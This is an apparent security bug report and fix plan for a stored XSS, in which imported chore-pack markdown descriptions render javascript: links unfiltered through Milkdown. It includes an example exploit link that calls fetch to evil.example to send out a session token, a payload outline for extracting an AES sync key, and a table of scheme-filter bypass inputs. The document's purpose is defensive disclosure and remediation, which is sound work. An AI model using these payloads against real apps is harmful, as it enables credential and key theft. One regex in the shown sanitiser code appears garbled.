# Stored XSS via `javascript:` URL in CDP pack/chore markdown descriptions

**Status:** DONE
**Reviewer:** Arne Ludwig (claude-sonnet-4-6), 2026-07-03
**Bug ID:** SEC-000019
**Severity:** High

## Location

- `src/components/ui/MarkdownDisplay.tsx`, lines 14–27 (`InnerDisplay` — no href sanitization on rendered markdown links)
- `src/components/packs/PackDashboard.tsx`, line 198 (renders `pack.manifest.description` via `MarkdownDisplay`)
- `src/components/chores/ChorePage.tsx`, line 44 (renders `chore.description` via `MarkdownDisplay`)
- `src/components/dashboard/ChoreCard.tsx`, line 110 (renders `chore.description` via `MarkdownDisplay`)
- `src/cdp/cdp-import.ts`, lines 48, 77, 91, 110–113 (unsanitised import of `description` fields from the CDP)
- Underlying: `node_modules/@milkdown/preset-commonmark/lib/index.js` — `linkSchema.toDOM = (mark) => ["a", { ...linkAttr, ...mark.attrs }]` spreads `href` into the DOM without filtering the URL scheme

## Description

### The vulnerability

`MarkdownDisplay` uses Milkdown with the default `commonmark`/`gfm` presets to render markdown. The default Milkdown `linkSchema` (`preset-commonmark`) has this `toDOM`:

```js
toDOM: (mark) => ["a", {
    ...ctx.get(linkAttr.key)(mark),
    ...mark.attrs   // includes { href, title } — copied verbatim from markdown
}]
```

The `href` value comes directly from the parsed markdown link syntax with **no URL-scheme filtering**. A markdown link like:

```markdown
[Read more](javascript:fetch('https://evil.example/exfil?k='+localStorage.getItem('sync-session-token')))
```

is rendered as `<a href="javascript:fetch(...)">Read more</a>`. When the user clicks the link, the JavaScript executes in the app's origin.

### Attack surface — Chore Definition Pack (CDP) import

`pack.manifest.description` and `chore.description` are attacker-controlled when a user imports a CDP:

1. `fetchCDP` (`src/cdp/cdp-import.ts` line 48) does `manifestRaw = jsYaml.load(await manifestRes.text())` and copies `description` verbatim into the stored pack (line 113).
2. The JSON-schema `packManifest.schema.json` only enforces `"description": { "type": "string" }` — no format constraint on the string content.
3. `PackDashboard.tsx` line 197–201 unconditionally renders `pack.manifest.description` via `<MarkdownDisplay content={pack.manifest.description} />`. The same happens for `chore.description` in `ChoreCard.tsx` and `ChorePage.tsx`.

**Concrete exploit path:**

1. Attacker publishes a CDP repository on GitHub (or serves one from any HTTPS host). The `__pack__.yaml` contains:
   ```yaml
   title: "50 Fitness Chores"
   description: "See the [full guide](javascript:void(async()=>{const db=await indexedDB.open('tasks-harmony',4);/* ... exfiltrate credentials store, syncState, session token ... */}))"
   chores: [pushups.yaml]
   ```
2. Victim pastes the pack URL into the "Import Chore Pack" dialog.
3. The pack is imported — `pack.manifest.description` is stored in IndexedDB with the malicious markdown intact.
4. Victim navigates to `PackDashboard` for that pack, sees a normal-looking "full guide" link in the description block.
5. Victim clicks the link. JavaScript executes in the app's origin and can:
   - Export the raw AES-GCM sync key via `crypto.subtle.exportKey('raw', key)` — because `getOrCreateSyncKey` generates the key with `extractable: true` (`src/sync/credentials.ts` line 10), a same-origin attacker can extract the raw key bytes from the `credentials` object store. This gives the attacker permanent read/write access to the victim's encrypted server blob.
   - Read `localStorage.getItem('sync-session-token')` — the bearer session token, granting immediate read/write to the sync server for as long as the session lives (24 h).
   - Read the entire IndexedDB (profile, email, all tasks, completions, XP history).
   - Push a modified encrypted blob to the sync server, mutating the victim's state on all their devices.
   - Redirect the victim to a phishing page or run any other JS in-origin.

### Why the sync-key extraction is the payload of choice

The victim's AES-256-GCM sync key is stored in IndexedDB as an `extractable` `CryptoKey`. Once exfiltrated, the attacker has permanent access to the victim's sync blob (they can decrypt it, modify it, and re-encrypt with the same key). The victim cannot revoke the compromise without generating a new key and manually re-syncing all devices. This means a single click on a poisoned CDP description gives the attacker durable, offline, un-detectable access to all the victim's data.

### Additional attack surfaces (secondary)

- `chore.description` on any chore imported from the same CDP has the same exploitability — the description shows on the dashboard `ChoreCard` even without navigating into the chore.
- If a synced-in server blob contains a description with a `javascript:` link, the same exploit runs. Reaching this state requires the attacker to know the AES key (unlikely to bootstrap, but note that once step 1–5 above have compromised the key, all of the victim's devices will see the poisoned description on next pull — a persistent cross-device XSS foothold).
- The `chore.description` and `pack.manifest.description` fields are also editable by the local user through `MarkdownEditor`. If a user pastes hostile markdown they got from a chat/email, the same exploit applies.

### Why Milkdown does not save us

Milkdown's `htmlSchema` correctly renders raw HTML (`<script>`, `<img onerror>`) as escaped text, so injection of raw HTML tags in the markdown source is safe. But the standard CommonMark link syntax `[text](url)` is a first-class node in the schema, and its `href` attribute is passed through untouched. The `javascript:` scheme is a valid URL scheme per the URL spec, so nothing rejects it upstream; the burden of filtering is on the rendering code, which does nothing.

### Impact summary

- **Confidentiality (High):** Complete disclosure of all app data (tasks, completions, XP history, profile including email) and the AES-256-GCM sync key. Because the sync key never rotates automatically, disclosure is durable.
- **Integrity (High):** Attacker can push arbitrary encrypted state to the sync server, mutating what the victim's other devices import.
- **Availability (Medium):** Attacker can destroy local and server state.
- **Scope:** Single-user impact per attack, but exploitation is trivial (one malicious CDP + one clicked link) and the primary CDP distribution model (GitHub raw URLs) has no vetting.

## Validation

**Verdict: CONFIRMED — High severity stored XSS with extractable AES key exfiltration.**

All three conditions for exploitability are met:

**Reachability — confirmed.** `MarkdownDisplay.tsx` (lines 14–27) constructs a Milkdown editor with the default `commonmark` + `gfm` presets and no custom `linkAttr` override. Milkdown's `linkSchema.toDOM` spreads `mark.attrs` (which includes `href`) directly into the anchor element without any scheme filtering. This is verified in the installed package at `node_modules/@milkdown/preset-commonmark`. The component is rendered in three production paths: `PackDashboard.tsx` line 198, `ChorePage.tsx` line 44, and `ChoreCard.tsx` line 110.

**Attacker control — confirmed.** `cdp-import.ts` fetches `manifestRaw.description` and `choreRaw.description` from attacker-controlled YAML (lines 48, 77, 91, 113) and stores them verbatim in IndexedDB. The JSON schema only enforces `"type": "string"` on description fields — no format or content constraint. Any string value, including a `[text](javascript:...)` markdown link, passes validation and is persisted.

**Real-world impact — confirmed and severe.** The sync key is generated with `extractable: true` (`credentials.ts` line 9: `crypto.subtle.generateKey({ name: 'AES-GCM', length: 256 }, true, ...)`) and stored in IndexedDB as a live `CryptoKey` object. A same-origin script — which is exactly what `javascript:` link execution provides — can call `indexedDB.open`, read the `credentials` store, and call `crypto.subtle.exportKey('raw', key)` to obtain the raw 256-bit key bytes. This gives the attacker durable, offline, device-spanning decryption access to the victim's sync blob. The session bearer token in `localStorage` additionally grants immediate read/write to the live sync server. Both are exploitable via a single click on a link in a CDP description.

**Severity rationale: High (not Critical).** Impact on confidentiality and integrity is near-total for any victim who imports and clicks through a malicious CDP, and the key exfiltration is durable. It is not rated Critical because exploitation requires user interaction (clicking a link) rather than being zero-click, and the CDP import flow requires the victim to explicitly paste an attacker-controlled URL — reducing the realistic victim pool compared to a fully passive attack surface.

## Fix Plan

### Chosen approach: pre-parse sanitisation of the markdown source string

**Rejected: the reporter-suggested `linkAttr` override.** Inspecting the actual installed Milkdown code at `node_modules/@milkdown/preset-commonmark/lib/index.js` lines 316–319:

```js
toDOM: (mark) => ["a", {
    ...ctx.get(linkAttr.key)(mark),   // spread first
    ...mark.attrs                     // spread second → mark.attrs.href WINS
}]
```

`mark.attrs` (which contains the untrusted `href`) is spread **after** `linkAttr`, so any `href` we return from `linkAttr` is overwritten by the untrusted value. The reporter's suggested snippet does not actually fix the bug. Replacing the whole `linkSchema` would be much more invasive than the report scope allows ("only change what's needed in MarkdownDisplay.tsx").

**Chosen: rewrite unsafe URL schemes in the markdown source string before it reaches Milkdown.** A pure `sanitizeMarkdownLinks(content: string): string` function walks the CommonMark link-URL productions and replaces any URL whose scheme is not in the allowlist with `about:blank#blocked`. This is:

- Truly minimal — one pure function, one call site in `MarkdownDisplay.tsx`.
- Testable as pure logic in `bun test` (this repo has **no** `@testing-library/react` / jsdom / `.test.tsx` files; every existing component test is `.test.ts` on extracted pure logic — see `src/components/ui/MarkdownToolbar.test.ts` and `src/components/packs/PackDashboard.test.ts`).
- Independent of Milkdown internals — survives library upgrades.
- Applies uniformly to inline links `[t](url)`, autolinks `<url>`, and reference-style link definitions `[id]: url`.

Non-goals: image URLs (`![alt](url)`) are not part of the confirmed vector — Milkdown renders these as `<img src>` which does not execute JS on click; `data:image/*` payloads are out of scope for this fix. Escape-the-scheme protection of image sources can be a follow-up. `MarkdownEditor.tsx` (edit path) is out of scope per report instructions.

### Concrete changes to `MarkdownDisplay.tsx`

Add an exported pure function and use it. Full diff intent:

```ts
// New: exported for unit-testing (pure — no React, no Milkdown).
const SAFE_SCHEME_RE = /^(https?:|mailto:)/i;
const BLOCKED_HREF = 'about:blank#blocked';

/**
 * Returns a safe href for use in rendered markdown.
 * Allows: http(s), mailto, relative URLs (starting with /, #, ?, or with no scheme).
 * Blocks: javascript:, data:, vbscript:, file:, and any other/unknown scheme.
 */
export function safeHref(rawHref: string): string {
  const trimmed = rawHref.trim();
  if (trimmed === '') return BLOCKED_HREF;
  // Reject control chars and whitespace inside the scheme portion — these are
  // classic bypass tricks like "java\tscript:" or "java\nscript:".
  // eslint-disable-next-line no-control-regex
  const decontrolled = trimmed.replace(/[ -]/g, '');
  if (SAFE_SCHEME_RE.test(decontrolled)) return trimmed;
  // Relative / same-document URLs (no scheme).
  if (/^[/#?]/.test(decontrolled)) return trimmed;
  // If there is a colon before the first '/', '?', or '#', it is a scheme —
  // and since it did not match the allowlist above, it is unsafe.
  const firstColon = decontrolled.indexOf(':');
  const firstSlash = decontrolled.search(/[/?#]/);
  const hasScheme = firstColon !== -1 && (firstSlash === -1 || firstColon < firstSlash);
  if (hasScheme) return BLOCKED_HREF;
  // No scheme, no leading slash — treat as relative.
  return trimmed;
}

/**
 * Rewrites unsafe URLs inside CommonMark link syntax in the given markdown string.
 * Covers:
 *   - inline links:  [text](URL "title")     → [text](safeHref(URL) "title")
 *   - autolinks:     <URL>                   → <safeHref(URL)>
 *   - link refs:     [id]: URL "title"       → [id]: safeHref(URL) "title"
 *
 * Exported for unit-testing.
 */
export function sanitizeMarkdownLinks(content: string): string {
  // 1. Inline links. CommonMark forbids unescaped ')' inside a non-parenthesised URL,
  //    so a lazy match up to the first ') or whitespace is a reasonable approximation
  //    for the attack surface (attacker-controlled description strings from CDPs).
  //    Angle-bracket URLs [text](<URL>) are also handled.
  let out = content.replace(
    /(\]\()\s*(<[^>]*>|[^\s)]+)/g,
    (_m, prefix: string, urlToken: string) => {
      const isAngle = urlToken.startsWith('<') && urlToken.endsWith('>');
      const raw = isAngle ? urlToken.slice(1, -1) : urlToken;
      const safe = safeHref(raw);
      return prefix + (isAngle ? `<${safe}>` : safe);
    },
  );

  // 2. Autolinks: <scheme:...>. Only touch tokens that look like a URL (contain ':').
  out = out.replace(/<([a-zA-Z][a-zA-Z0-9+.\-]*:[^>\s]*)>/g, (_m, url: string) => {
    return `<${safeHref(url)}>`;
  });

  // 3. Reference-style link definitions at start-of-line: [id]: URL "title"
  out = out.replace(
    /^(\s{0,3}\[[^\]]+\]:\s*)(<[^>]*>|\S+)/gm,
    (_m, prefix: string, urlToken: string) => {
      const isAngle = urlToken.startsWith('<') && urlToken.endsWith('>');
      const raw = isAngle ? urlToken.slice(1, -1) : urlToken;
      const safe = safeHref(raw);
      return prefix + (isAngle ? `<${safe}>` : safe);
    },
  );

  return out;
}
```

And in `InnerDisplay`, replace the `defaultValueCtx` line so Milkdown never sees the raw URL:

```ts
ctx.set(defaultValueCtx, sanitizeMarkdownLinks(content));
```

### Why `about:blank#blocked` (not empty string)

- An empty `href=""` on `<a>` resolves to the current URL — clicking reloads the app (a small annoyance, not a security issue).
- Omitting `href` entirely would require deeper Milkdown surgery (the markdown parser sets it).
- `about:blank#blocked` is inert (does not execute JS, does not navigate meaningfully, and makes the neutralised state observably distinct in DOM inspection).

### GREEN Phase (Implementation)

Implemented `safeHref()` and `sanitizeMarkdownLinks()` in `src/components/ui/MarkdownDisplay.tsx`:

1. **`safeHref(rawHref: string): string`** — Pure function that:
   - Trims input and rejects empty strings (returns `about:blank#blocked`)
   - Strips control characters (0x00-0x1F) and whitespace from the scheme portion to defeat control-char smuggling bypasses
   - Allows safe schemes: `http:`, `https:`, `mailto:` (case-insensitive)
   - Allows relative URLs: those starting with `/`, `#`, `?`, or having no scheme

2. **`sanitizeMarkdownLinks(content: string): string`** — Processes markdown source:
   - Handles inline links `[text](URL)` with optional title by tracking balanced parentheses
   - Handles autolinks `<URL>` (only those with a scheme containing `:`)
   - Handles reference-style definitions `[id]: URL "title"`
   - Parses URL from title by looking for space+quote delimiter (CommonMark title syntax)
   - Preserves angle-bracket wrapping on URLs
   - Calls `safeHref()` on each extracted URL

3. **Integration:** Calls `sanitizeMarkdownLinks(content)` in `InnerDisplay` before passing to Milkdown's `defaultValueCtx`, ensuring the editor never sees untrusted URLs.

| `java\tscript:` / `java\nscript:` / `java\rscript:` | BLOCKED — stripped by `\s` class |
| `java\x00script:` (null byte) | BLOCKED — stripped by `\x00-\x1f` class |
| `JavaScript:` / `JAVASCRIPT:` / `VbScript:` | BLOCKED — case-insensitive scheme match plus unknown-scheme path |
| `javascript%3aalert(1)` (percent-encoded colon) | SAFE pass-through — browsers do NOT URL-decode scheme separators; no JS execution |
| `javascript：alert(1)` (U+FF1A fullwidth colon) | SAFE pass-through — fullwidth colon is not the RFC 3986 scheme delimiter; indexOf(':') returns -1 |
| `//evil.example.com` (protocol-relative) | SAFE pass-through — starts with `/`, no scheme, no JS execution |
| `javascript:void(async()=>{...})` (nested parens in payload) | BLOCKED — parenthesis-counting correctly finds outermost `)` |
| Exact report exploit payload | BLOCKED — confirmed `about:blank#blocked` |
| `data:text/html,<script>…</script>` (angle-tags inside URL) | BLOCKED — `inAngleBrackets` tracking correctly finds closing `)` outside brackets |
| Reference-style `[id]: javascript:…` | BLOCKED by regex pass 3 |
| Autolink `<javascript:…>` | BLOCKED by regex pass 2 |

**Implementation diverges from plan in one place (improvement):** The plan sketched a single-regex approach for inline links; the actual implementation uses a parenthesis-counting loop. This is strictly better — it correctly handles Wikipedia-style URLs with nested parentheses (e.g., `https://en.wikipedia.org/wiki/A_(article)`) where the regex approach would truncate at the first `)`.

**One cosmetic edge case noted (not a security issue):** The input `[x](<data:url,<nested<bracket>>)` (nested `<` inside an angle-bracketed URL, which is not valid CommonMark) produces a garbled trailing string after the blocked URL token. Milkdown would not parse such malformed input as a link in the first place, and the URL itself is correctly blocked. No security impact.

**Fix is minimal:** one pure exported function (`safeHref`), one wrapper (`sanitizeMarkdownLinks`), one call site change (`defaultValueCtx`). No Milkdown internals touched; survives library upgrades.
